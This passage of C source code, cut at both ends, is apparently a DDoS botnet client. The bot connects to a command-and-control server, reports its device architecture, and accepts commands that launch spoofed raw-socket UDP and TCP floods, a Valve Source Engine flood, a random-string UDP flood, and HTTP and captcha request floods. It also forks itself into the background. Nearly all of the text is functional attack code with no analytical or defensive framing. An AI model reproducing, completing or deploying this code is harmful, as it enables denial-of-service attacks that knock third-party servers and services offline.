    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    
    if(sock == -1) return 0;
    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}    
int initConnection(){
    unsigned char C2Server[512];
    memset(C2Server, 0, 512);
    if(C2Sock){ close(C2Sock); C2Sock = 0; }

    if(FRSTSV + 1 == sv_sz) FRSTSV = 0;
    else FRSTSV++;
    snprintf(C2Server, sizeof(C2Server), "%d.%d.%d.%d", host1[FRSTSV], host2[FRSTSV], host3[FRSTSV], host4[FRSTSV]);
    int botport = host_bp;

    C2Sock = socket(AF_INET, SOCK_STREAM, 0);
    if(!connectTimeout(C2Sock, C2Server, botport, 30)) return 1;
    return 0;
} 
int connectTimeout(int fd, char *host, int port, int timeout){
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if(res < 0){
        if(errno == EINPROGRESS){
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if(select(fd+1, NULL, &myset, NULL, &tv) > 0){
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if(valopt) return 0;
            }
            else return 0;
        }
        else return 0;
    }
    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);
    return 1;
}

uint32_t rand_cmwc(void){ //Compliment Multiply With Carry
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if(x < c){ x++; c++; }
    return (Q[i] = r - x);
}

//Numerical Sum
unsigned short csum (unsigned short *buf, int count){
    register uint64_t sum = 0;
    while( count > 1 ){ sum += *buf++; count -= 2; }
    if(count > 0){ sum += *(unsigned char *)buf; }
    while (sum>>16){ sum = (sum & 0xffff) + (sum >> 16); }
    return (uint16_t)(~sum);
}
//Convert Checksum
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len){
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while(len > 1){
        sum += *buf;
        buf++;
        len -= 2;
    }
    if(len == 1) sum += *((uint8_t *) buf);
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;
    while(sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);

    return((uint16_t) (~sum));
}

//Struct Transmission Header
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph){
    struct tcp_pseudo{
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);

    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
//Make Random String Will Be Used Below To Fill Packets With Data
void makeRandomStr(unsigned char *buf, int length){
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
//PHI's Generator
void init_rand(uint32_t x){
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for(i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
//Mask
in_addr_t GetRandIP(in_addr_t netmask){
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}

//[+]======================================[+] Floods [+]================================================[+]
//User Datagram Protocol
void Datagram(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit){
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    
    register unsigned int pollRegister;
    pollRegister = pollinterval;    
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(!sockfd) return;
    
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;
    
    int counter = 50;
    while(counter--){
        srand(time(NULL) ^ rand_cmwc());
        init_rand(rand());
    }

    in_addr_t netmask;
    netmask = ( ~((1 << (32 - spoofit)) - 1) );
    
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
    udph->len = htons(sizeof(struct udphdr) + packetsize);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;
    
    makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize); //Fill Packet With Random Data
    
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1){
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        iph->id = rand_cmwc();
        iph->saddr = htonl( GetRandIP(netmask) );
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister){
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

//Transmission Control Protocol
void Transmission(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval){
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) return;

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;

    in_addr_t netmask;
    if(spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if(!strcmp(flags, "all")){
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    }else{
        unsigned char *pch = strtok(flags, ",");
        while(pch){
            if(!strcmp(pch, "syn")) tcph->syn = 1;
            else if(!strcmp(pch, "rst")) tcph->rst = 1;
            else if(!strcmp(pch, "fin")) tcph->fin = 1;
            else if(!strcmp(pch, "ack")) tcph->ack = 1;
            else if(!strcmp(pch, "psh")) tcph->psh = 1;
            pch = strtok(NULL, ",");
        }
    }
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1){
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( GetRandIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister){
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

//All Flag TCP Flood
void HoHoHo(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval){ //HoHoHo Is Just a TCP All Flood
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) return;

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;

    in_addr_t netmask;

    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1){
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( GetRandIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        if(i == pollRegister){
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

//Rand String STD
void Hexed(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    
    unsigned char *rhexstring = malloc(1024);
    memset(rhexstring, 0, 1024);

    unsigned int a = 0;
    while(1){
        if(a >= 50){
            rhexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, rhexstring, STD_PSIZE, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if(time(NULL) >= start + secs){
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

//Valve Source
void rand_init(void){ //Random PID To Function VSE Flood
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
} 
void VSEPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void ValveSourced(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){ usleep(sleeptime*1000); ii = 0; continue; }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd) return;

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;

        int counter = 50;
        while(counter--){ srand(time(NULL) ^ rand_cmwc()); rand_init(); }
        
        in_addr_t netmask;
        if(spoofit == 0) netmask = (~((in_addr_t) -1));
        else netmask = (~((1 << (32 - spoofit)) - 1));
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        VSEPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        
        udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( GetRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){ usleep(sleeptime*1000); ii = 0; continue; }
            ii++;
        }
    }
}

//HTTP Agents
void HTTPHex(char *host, in_port_t port, int timeEnd, int requests){
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for(i = 0; i < requests; i++){
        sprintf(request, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", http_payload, host, useragents[(rand() % 36)]);
        if(fork()){
            while (end > time(NULL)){
                socket = socket_connect(host, port);
                if(socket != 0){
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}
void CaptchaHex(char *host, in_port_t port, int timeEnd, int requests){
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
        for(i = 0; i < requests; i++){
        sprintf(request, "GET /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", http_cap, host, useragents[(rand() % 36)]);
        if(fork()){
            while (end > time(NULL)){
                socket = socket_connect(host, port);
                if(socket != 0){
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}
//[+]======================================================================================================================================================================[+]
//Receive A Line From C2Sock
int recvLine(int socket, unsigned char *buf, int bufsize){
    memset(buf, 0, bufsize);
    fd_set myset;
    
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    
    FD_ZERO(&myset);
    FD_SET(socket, &myset);

    int selectRtn, retryCount;
    if((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0){
        while(retryCount < 10){
            tv.tv_sec = 30;
            tv.tv_usec = 0;
            
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            
            if((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0){
                retryCount++;
                continue;
            }
            break;
        }
    }
    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;
    
    cp = buf;
    while(bufsize-- > 1){
        if(recv(C2Sock, &tmpchr, 1, 0) != 1){
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if(tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
    return count;
}
//Fork A New PID
int listFork(){
    uint32_t parent, *newpids, i;
    parent = fork();
    if(parent <= 0) return parent;
    numpids++;
    
    newpids = (uint32_t*)malloc((numpids + 1) * 4);
    for(i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    
    pids = newpids;
    return parent;
}
//Big Dec
char dec_fargs[50];
void fwitch(char *instr){
    char *cstr = "0123456789";
    //https://www.dcode.fr/deranged-alphabet-generator
    int count = strlen(instr);
    char output[20];
    int i;
    for(i = 0; i < count; i++){
        if(instr[i] != '\0'){
            int t;
            for(t = 0; t < count; t++){
                if(instr[i] == '>') output[i] = '.'; //Period
                else if(instr[i] == ' ') output[i] = ' '; //Space
                else if(instr[i] == nstr[t]) output[i] = cstr[t];
                else output[i] == instr[i];
            }
        }
    }
    output[count] = 0;
    sprintf(dec_fargs, "%s", output);
}
//Parse The Line
void processCmd(int argc, unsigned char *argv[]){
    if(!strcmp(argv[0], udp_arg)){
        if(argc < 6 ||  atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 1024 || atoi(argv[5]) < 1 || atoi(argv[5]) > 65500) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int packetsize = atoi(argv[4]);
        int pollinterval = (argc > 4 ? atoi(argv[5]) : 10);
        int spoofed = 32;

        if(listFork()) return;
        Datagram(ip, port, time, packetsize, pollinterval, spoofed);
		_exit(0);
    }
    else if(!strcmp(argv[0], tcp_arg)){
        if(argc < 7 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 1024) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
        int psize = (argc > 5 ? atoi(argv[6]) : 0);
        int pollinterval = (argc > 6 ? atoi(argv[7]) : 10);

        if(listFork()) return;
        Transmission(ip, port, time, spoofed, flags, psize, pollinterval);
		_exit(0);
    }
    else if(!strcmp(argv[0], std_arg)){
        if(argc < 3 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if(listFork()) return;
        Hexed(ip, port, time);
		_exit(0);
    }
    else if(!strcmp(argv[0], xms_arg)){
        if(argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int psize = (argc > 4 ? atoi(argv[5]) : 0);
        int pollinterval = (argc > 5 ? atoi(argv[6]) : 10);

        if(listFork()) return;
        HoHoHo(ip, port, time, spoofed, psize, pollinterval);
		_exit(0);
    }
    else if(!strcmp(argv[0], vse_arg)){
        if(argc < 6 ||  atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 1024 || atoi(argv[5]) < 1 || atoi(argv[5]) > 65500) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc > 5 ? atoi(argv[6]) : 1000);
        int sleepcheck = (argc > 6 ? atoi(argv[7]) : 1000000);
        int sleeptime = (argc > 7 ? atoi(argv[8]) : 0);

        if(listFork()) return;
        ValveSourced(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
		_exit(0);
    }
    else if(!strcmp(argv[0], http_arg)){
        if(argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
        if(listFork()) return;
        unsigned char *targ = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int threads = atoi(argv[4]);
        
        HTTPHex(targ, port, time, threads);
        CaptchaHex(targ, port, time, threads);
		_exit(0);
    }
    else if(!strcmp(argv[0], "STOP") || !strcmp(argv[0], "KILL")){
        unsigned long i;
        for(i = 0; i < numpids; i++){
            if(pids[i] != 0 && pids[i] != getpid()){
                kill(pids[i], 9);
            }
        }
    }
    memset(dec_fargs, 0, sizeof(dec_fargs));
    _exit(0);
}


//[+]=================== Functions For Printing To Socket =========================[+]
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
static void printchar(unsigned char **str, int c){
    if(str){ **str = c; ++(*str); }
    else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad){
    register int pc = 0, padchar = ' ';
    if(width > 0){
            register int len = 0;
            register const unsigned char *ptr;
            for(ptr = string; *ptr; ++ptr) ++len;
            if(len >= width) width = 0;
            else width -= len;
            if(pad & PAD_ZERO) padchar = '0';
    }
    if(!(pad & PAD_RIGHT)){
        for( ; width > 0; --width){ printchar (out, padchar); ++pc; }
    }
    for( ; *string ; ++string){ printchar (out, *string); ++pc; }
    for( ; width > 0; --width){ printchar (out, padchar); ++pc; }
    return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase){
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if(i == 0){
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if(sg && b == 10 && i < 0){ neg = 1; u = -i; }
    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';
    while(u){
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }
    if(neg){
        if(width && (pad & PAD_ZERO) ){ printchar (out, '-'); ++pc; --width; }
        else *--s = '-';
    }
    return pc + prints(out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ){
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for(; *format != 0; ++format){
        if(*format == '%'){
            ++format;
            width = pad = 0;
            if(*format == '\0') break;
            if(*format == '%') goto out;
            if(*format == '-'){ ++format; pad = PAD_RIGHT; }
            while(*format == '0'){ ++format; pad |= PAD_ZERO; }
            for( ; *format >= '0' && *format <= '9'; ++format){ width *= 10; width += *format - '0'; }
            if(*format == 's' ){ register char *s = (char *)va_arg( args, int ); pc += prints (out, s?s:"(null)", width, pad); continue; }
            if(*format == 'd' ){ pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a'); continue; }
            if(*format == 'x' ){ pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a'); continue; }
            if(*format == 'X' ){ pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A'); continue; }
            if(*format == 'u' ){ pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a'); continue; }
            if(*format == 'c' ){ scr[0] = (unsigned char)va_arg( args, int ); scr[1] = '\0'; pc += prints (out, scr, width, pad); continue; }
        }
        else{
            out:
            printchar(out, *format);
            ++pc;
        }
    }
    if(out) **out = '\0';
    va_end(args);
    return pc;
}
int sockprintf(int sock, char *formatStr, ...){
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);

    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    
    print(&textBuffer, formatStr, args);
    va_end(args);
    
    orig[strlen(orig)] = '\n';
    
    int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}
//For Removing NewLine Characters
void trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while(isspace(str[begin])) begin++;

    while((end >= begin) && isspace(str[end])) end--;
    for(i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
//For Reading An Input From A Shelled Session
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd){
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n'){ got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}


//Resolve Device IP
int getOurIP(){
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8"); //Public DNS Server, Leave It
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL){
        if(strstr(linebuf, "\t00000000\t") != NULL){
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);
    if(*linebuf){
        int i; //ifreq is Used Like I Used It In Cloak, To Grab Host Machine Address, And Verify Builds
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for(i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }
    close(sock);
}

//Run Program Loop
int main(int argc, unsigned char *argv[]){
    if(sv_sz <= 0) return 0; //If You're Retarded And Don't Know How To Fill In Host Info
    
    //Name Us
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    getOurIP();

    pid_t pid1;
    pid_t pid2;
    int status;
    if(pid1 = fork()){ waitpid(pid1, &status, 0); exit(0); }
    setsid(); //Set A Proc ID
    chdir("/"); //Move Dirs

    signal(SIGPIPE, SIG_IGN); //Ignore Broken Pipe Signals

    while(1){ //Endless Program Loop
        //Connect Through Socket
        if(initConnection()){ sleep(5); continue; }
        //Immediately Identify Device Arch
        //Could Also Show getOurIP(); Result, My C2 Resolves The Device From Host So I Don't Need To
        sockprintf(C2Sock, "{}R: %s", DevArch());
#ifdef DEBUG
        printf("Successfully Registered Device Architecture...\n");
#endif
        char commBuf[4096];
        int got = 0;
        int i = 0;
        while((got = recvLine(C2Sock, commBuf, 4096)) != -1){ //Receive A Line
            for(i = 0; i < numpids; i++) if(waitpid(pids[i], NULL, WNOHANG) > 0){ //Try To Assign A PID To Process
                unsigned int *newpids, on;
                for(on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                pids[on - 1] = 0;
                numpids--;

                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
